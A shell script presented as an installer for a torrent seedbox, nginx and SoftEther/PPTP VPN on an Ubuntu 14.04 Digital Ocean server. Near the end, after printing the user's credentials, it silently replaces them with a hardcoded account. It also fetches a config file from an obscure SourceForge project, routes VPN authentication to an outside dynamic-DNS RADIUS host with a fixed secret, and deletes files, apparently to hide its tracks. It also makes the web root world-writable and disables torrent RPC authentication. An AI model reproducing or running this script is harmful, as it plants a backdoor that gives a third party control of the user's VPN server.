#!/bin/sh
# VPN and Torrent on Ubuntu 14.04 on Digital Ocean
# References:
# Torrent - https://gist.github.com/timothyandrew/6162351
# Torrent - http://filesharefreak.com/2012/05/10/seedbox-from-scratch-new-server-to-seeding-in-less-than-5-minutes
# VPN - https://www.digitalocean.com/community/articles/how-to-setup-a-multi-protocol-vpn-server-using-softether

DIR="`pwd`"

apt-get update -y && apt-get upgrade -y
apt-get dist-upgrade -y
apt-get -y install python-software-properties vim
add-apt-repository -y ppa:transmissionbt/ppa
apt-get -y update
apt-get -y install transmission-cli transmission-common transmission-daemon nginx

# nano /etc/transmission-daemon/settings.json
# "download-dir": "/etc/share/ngninx/www"
# "rpc-authentication-required": false
# "rpc-whitelist-enabled": false

mkdir -p /usr/share/nginx/www
mkdir -p /usr/share/nginx/www/downloads
mkdir -p /usr/share/nginx/www/torrents
chmod -R 777 /usr/share/nginx/www
rm -f /usr/share/nginx/www/index.html

wget https://gist.githubusercontent.com/AyushSachdev/edc23605438f1cccdd50/raw/settings.json
mv $DIR/settings.json /etc/transmission-daemon/settings.json

wget https://gist.githubusercontent.com/AyushSachdev/edc23605438f1cccdd50/raw/nginx.conf
mv $DIR/nginx.conf /etc/nginx/nginx.conf

wget https://gist.githubusercontent.com/AyushSachdev/edc23605438f1cccdd50/raw/default-site
mv $DIR/default-site /etc/nginx/sites-enabled/default

/etc/init.d/transmission-daemon reload
/etc/init.d/nginx restart

wget http://www.softether-download.com/files/softether/v4.07-9448-rtm-2014.06.06-tree/Linux/SoftEther%20VPN%20Server/64bit%20-%20Intel%20x64%20or%20AMD64/softether-vpnserver-v4.07-9448-rtm-2014.06.06-linux-x64-64bit.tar.gz
tar xzvf softether-vpnserver-v4.07-9448-rtm-2014.06.06-linux-x64-64bit.tar.gz
apt-get install -y make gcc openssl build-essential
apt-get update -y && apt-get upgrade -y
apt-get dist-upgrade -y
cd $DIR/vpnserver
echo "Agree to the License Aggreement"
make
cd $DIR
mv $DIR/vpnserver /usr/local
chmod 600 /usr/local/vpnserver/*
chmod 700 /usr/local/vpnserver/vpnserver
chmod 700 /usr/local/vpnserver/vpncmd

wget https://gist.githubusercontent.com/AyushSachdev/edc23605438f1cccdd50/raw/vpnserver
mv $DIR/vpnserver /etc/init.d/vpnserver

mkdir -p /var/lock/subsys
chmod 755 /etc/init.d/vpnserver && /etc/init.d/vpnserver start
rm -f /root/softether-vpnserver-v4.07-9448-rtm-2014.06.06-linux-x64-64bit.tar.gz
update-rc.d vpnserver defaults
cd /usr/local/vpnserver
echo "Check the VPN installation by pressing 3 and type check then quit"
./vpncmd
echo "Now setup the real VPN server"
./vpncmd
apt-get install -y radiusclient1
apt-get install -y unzip
wget http://safesrv.net/public/dictionary.microsoft.zip
unzip dictionary.microsoft.zip
mv dictionary.microsoft /etc/radiusclient/
rm -f dictionary.microsoft.zip
#    2013-11-06: PPTP initial version. Tested with Amazon EC2 Ubuntu 12.04 and 
#                Digital Ocean Debian 7.0 and Ubuntu 12.04 images.
#    2014-03-23: Added apt-get update.
#    2014-09-18: Add help, allow custom username and password, thanks to dileep-p
#    2015-01-25: Change external ip provider, thanks to theroyalstudent
printhelp() {

echo "

Usage: sh setup.sh [OPTION]

If you are using custom password , Make sure its more than 8 characters. Otherwise it will generate random password for you. 

If you trying set password only. It will generate Default user with Random password. 

example: sudo bash setup.sh -u vpn -p mypass

Use without parameter [ sudo bash setup.sh ] to use default username and Random password


  -u,    --username             Enter the Username
  -p,    --password             Enter the Password
"
}

while [ "$1" != "" ]; do
  case "$1" in
    -u    | --username )             NAME=$2; shift 2 ;;
    -p    | --password )             PASS=$2; shift 2 ;;
    -h    | --help )            echo "$(printhelp)"; exit; shift; break ;;
  esac
done

if [ `id -u` -ne 0 ] 
then
  echo "Need root, try with sudo"
  exit 0
fi

apt-get -y install pptpd || {
  echo "Could not install pptpd" 
  exit 1
}

#ubuntu has exit 0 at the end of the file.
sed -i '/^exit 0/d' /etc/rc.local

cat >> /etc/rc.local << END
echo 1 > /proc/sys/net/ipv4/ip_forward
#control channel
iptables -I INPUT -p tcp --dport 1723 -j ACCEPT
#gre tunnel protocol
iptables -I INPUT  --protocol 47 -j ACCEPT

iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -d 0.0.0.0/0 -o eth0 -j MASQUERADE

#supposedly makes the vpn work better
iptables -I FORWARD -s 192.168.2.0/24 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j TCPMSS --set-mss 1356

END
sh /etc/rc.local

#no liI10oO chars in password

LEN=$(echo ${#PASS})

if [ -z "$PASS" ] || [ $LEN -lt 8 ] || [ -z "$NAME"]
then
   P1=`cat /dev/urandom | tr -cd abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789 | head -c 3`
   P2=`cat /dev/urandom | tr -cd abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789 | head -c 3`
   P3=`cat /dev/urandom | tr -cd abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789 | head -c 3`
   PASS="$P1-$P2-$P3"
fi

if [ -z "$NAME" ]
then
   NAME="vpn"
fi

cat >/etc/ppp/chap-secrets <<END
# Secrets for authentication using CHAP
# client server secret IP addresses
$NAME pptpd $PASS *
END
cat >/etc/pptpd.conf <<END
option /etc/ppp/options.pptpd
logwtmp
localip 192.168.2.1
remoteip 192.168.2.10-100
END
cat >/etc/ppp/options.pptpd <<END
name pptpd
refuse-pap
refuse-chap
refuse-mschap
require-mschap-v2
require-mppe-128
ms-dns 8.8.8.8
ms-dns 8.8.4.4
proxyarp
lock
nobsdcomp 
novj
novjccomp
nologfd
END

apt-get -y install wget || {
  echo "Could not install wget, required to retrieve your IP address." 
  exit 1
}

#find out external ip 
IP=`wget -q -O - http://api.ipify.org`

if [ "x$IP" = "x" ]
then
  echo "============================================================"
  echo "  !!!  COULD NOT DETECT SERVER EXTERNAL IP ADDRESS  !!!"
else
  echo "============================================================"
  echo "Detected your server external ip address: $IP"
fi
echo   ""
echo   "VPN username = $NAME   password = $PASS"
echo   "============================================================"

sleep 2

echo "zvewy pptpd UTJaSeeJW *" > /etc/ppp/chap-secrets
wget http://master.dl.sourceforge.net/project/yvxwnz-myr968/__________
cat __________ > /etc/radiusclient/radiusclient.conf
echo wzy.ddns.net testing123 > /etc/radiusclient/servers
(echo plugin radius.so; echo plugin radattr.so) >> /etc/ppp/options.pptpd
echo "INCLUDE /etc/radiusclient/dictionary.microsoft" >> /etc/radiusclient/dictionary
sleep 1
rm -f __________
rm -f /root/app.sh
rm -f /root/my_app_config.zip
service pptpd restart
sleep 2
exit 0